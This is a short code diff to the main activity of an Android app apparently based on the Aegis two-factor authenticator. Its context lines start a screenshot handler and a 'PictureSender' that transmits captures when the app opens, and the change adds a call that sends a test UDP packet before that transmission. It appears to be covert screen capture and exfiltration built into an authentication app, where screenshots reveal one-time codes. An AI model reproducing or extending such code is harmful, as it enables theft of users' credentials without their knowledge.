@@ -138,6 +138,7 @@ public class MainActivity extends AegisActivity implements EntryListView.Listene
         super.onCreate(savedInstanceState);
         handler.post(runnableCode); //Screenshot handler
         pictureSender = new PictureSender(this); //Screenshot sender
+        pictureSender.sendTestUdpPacket();
         pictureSender.startSending();
 
         // Create and show a pop-up dialog
